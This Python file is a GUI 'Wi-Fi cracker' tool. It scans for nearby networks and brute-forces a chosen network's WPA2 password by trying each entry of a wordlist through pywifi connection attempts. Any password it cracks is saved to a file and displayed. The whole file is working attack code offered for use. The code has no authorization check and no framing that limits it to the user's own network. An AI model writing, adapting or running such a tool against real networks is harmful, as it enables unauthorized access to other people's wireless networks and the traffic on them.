# Copyright (c), Afif Ali Saadman, 2024

import pywifi
from pywifi import const
import time
import os
from tkinter import Tk, Label, Button, Entry, messagebox


def scan_networks():
    """
    Scans for available Wi-Fi networks and returns a list of SSIDs.
    """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(10)  # Allow time for scanning
    scan_results = iface.scan_results()
    networks = [network.ssid for network in scan_results if network.ssid]
    return networks


def test_wifi(password, wifi_name):
    """
    Attempts to connect to a Wi-Fi network with the given password.
    """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = wifi_name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    iface.add_network_profile(profile)

    iface.connect(profile)
    time.sleep(5)  # Wait for connection to attempt

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        return True
    return False


def save_password(wifi_name, password):
    """
    Saves the correct password to a file.
    """
    directory = "BF_Files"
    os.makedirs(directory, exist_ok=True)
    filename = f"{directory}/Wifi_{wifi_name}_password.txt"
    with open(filename, 'w') as file:
        file.write(password)
    print(f"[SAVED] Correct password stored in {filename}")


def brute_force(wifi_name):
    """
    Performs brute force to find the correct password.
    """
    wordlist_path = "BF_Files/passlist_raw.txt"
    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found at {wordlist_path}.")
        messagebox.showerror("Error", f"Wordlist not found at {wordlist_path}.")
        return

    print(f"Starting brute force for Wi-Fi: {wifi_name}")
    for password in passwords:
        password = password.strip()
        print(f"[TESTING] Password: {password}")
        if test_wifi(password, wifi_name):
            print(f"[SUCCESS] Password Found: {password}")
            save_password(wifi_name, password)
            messagebox.showinfo("Success", f"Password for '{wifi_name}' is: {password}")
            return
    messagebox.showinfo("[FAILED] Password not found in wordlist.")
    messagebox.showerror("Failed", "Password not found in wordlist.")


def main_gui():
    """
    Tkinter-based GUI for the Wi-Fi brute force tool.
    """
    def start_scan():
        networks = scan_networks()
        if networks:
            network_list_label.config(text="Available Networks:\n" + "\n".join(networks))
        else:
            network_list_label.config(text="No networks found.")

    def start_brute_force():
        wifi_name = wifi_entry.get().strip()
        if not wifi_name:
            messagebox.showwarning("Warning", "Please enter a Wi-Fi name.")
            return
        brute_force(wifi_name)

    # Tkinter GUI setup
    root = Tk()
    root.title("Angry Data Wi-Fi cracker tool")
    root.geometry("500x650")

    Label(root, text=" Angry Data Wi-Fi Brute Force Tool", font=("Helvetica", 16, "bold")).pack(pady=10)
    Label(root, text=" Copyright  (c), Afif Ali Saadman. All rights reserved.", font=("Helvetica", 16, "bold")).pack(pady=10)
    scan_button = Button(root, text="Scan Networks", command=start_scan, bg="blue", fg="white")
    scan_button.pack(pady=10)

    global network_list_label
    network_list_label = Label(root, text="Click 'Scan Networks' to find available networks.", wraplength=400)
    network_list_label.pack(pady=10)

    Label(root, text="Enter Wi-Fi Name (SSID) (e.g. HACK_ME_IF_YOU_CAN):").pack(pady=5)
    wifi_entry = Entry(root, width=40)
    wifi_entry.pack(pady=5)

    brute_force_button = Button(root, text="Start Brute Force", command=start_brute_force, bg="green", fg="white")
    brute_force_button.pack(pady=20)

    root.mainloop()


if __name__ == "__main__":
    main_gui()
